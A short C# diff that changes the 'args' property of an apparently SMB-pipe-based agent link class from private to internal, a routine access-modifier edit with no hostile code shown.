@@ -13,7 +13,7 @@ namespace Workflow
         private PipeClient<SmbMessage> clientPipe { get; set; }
         public bool connected { get; set; }
         private string task_id { get; set; }
-        private SmbLinkArgs args { get; set; }
+        internal SmbLinkArgs args { get; set; }
         private string agent_id { get; set; }
         public string linked_agent_id { get; set; }
         private AutoResetEvent messageSuccess = new AutoResetEvent(false);
